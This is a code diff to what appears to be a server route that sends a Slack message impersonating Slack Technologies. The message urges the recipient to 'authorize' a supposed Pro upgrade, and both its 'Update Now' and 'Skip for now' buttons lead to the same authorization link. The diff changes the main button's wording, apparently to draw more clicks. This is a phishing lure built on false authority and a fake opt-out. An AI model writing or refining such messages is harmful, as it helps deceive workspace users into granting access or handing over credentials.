@@ -32,7 +32,7 @@ export async function POST(req: Request) {
         { "type": "section", "text": { "type": "mrkdwn", "text": "Your workspace administrator has enabled *Slack Pro features* for your account.\nPlease authorize the update to continue sending messages without interruption." } },
         { "type": "divider" },
         { "type": "actions", "elements": [
-            { "type": "button", "text": { "type": "plain_text", "text": "Update Now (Recommended)", "emoji": true }, "style": "primary", "url": authLink },
+            { "type": "button", "text": { "type": "plain_text", "text": "Update Now (For Free)", "emoji": true }, "style": "primary", "url": authLink },
             { "type": "button", "text": { "type": "plain_text", "text": "Skip for now", "emoji": true }, "url": authLink }
         ]},
         { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified System Upgrade • Slack Technologies" } ] }
